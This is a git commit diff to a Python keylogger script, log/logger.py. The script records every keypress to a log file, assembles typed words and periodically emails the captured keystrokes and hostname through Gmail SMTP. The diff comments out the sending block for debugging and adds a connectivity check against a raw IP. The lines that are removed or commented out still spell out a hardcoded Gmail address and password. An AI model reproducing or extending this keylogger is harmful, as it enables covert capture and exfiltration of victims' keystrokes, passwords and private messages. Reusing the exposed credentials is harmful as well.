3b17ff04bf36c943312b32a48c37b12aa580af0a
wd7512 <wwdennis.home@gmail.com>
2018-11-15 19:08:36 +0000

    a

--- log/logger.py
+++ log/logger.py
@@ -3,6 +3,8 @@ import logging
 import datetime
 import smtplib
 import platform
+#import urllib2
+
 global maildata
 global sendfreq
 global sent
@@ -20,6 +22,13 @@ log_dir = ""
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
+def gmail_on():
+    try:
+        urllib2.urlopen('http://52.97.131.226', timeout=1)
+        return True
+    except urllib2.URLError as err:
+        return False
+
 def on_press(key):
     logging.info(str(key))
 
@@ -31,28 +40,32 @@ def on_press(key):
 
     #print(abs(mins-datetime.datetime.now().minute))
     #print(sent)
-    word=word+str(key)[1]
+    
 
     if len(str(key))!=3:
         maildata.append(word)
-        #print(maildata)
+        maildata.append(str(key))
+        print(maildata)
         word=''
-
+    else:
+        word=word+str(key)[1]
     
-    #print(word)
+    
+    print(word)
 
     if sent==True and abs(mins-datetime.datetime.now().minute)>0:
         sent=False
     if abs(mins-datetime.datetime.now().minute)>=sendfreq and sent==False:
         mins=datetime.datetime.now().minute
-        #print('sending email')
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login("band.mishaps@gmail.com", "Baobab7512")
-        server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
-        server.quit()
-        #print('email sent')
-        #print(maildata)
+        
+        print('sending email')
+        #server = smtplib.SMTP('smtp.gmail.com', 587)
+        #server.starttls()
+        #server.login("band.mishaps@gmail.com", "Baobab7512")
+        #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
+        #server.quit()
+        print('email sent')
+        print(maildata)
         sent=True
         maildata=[]
 
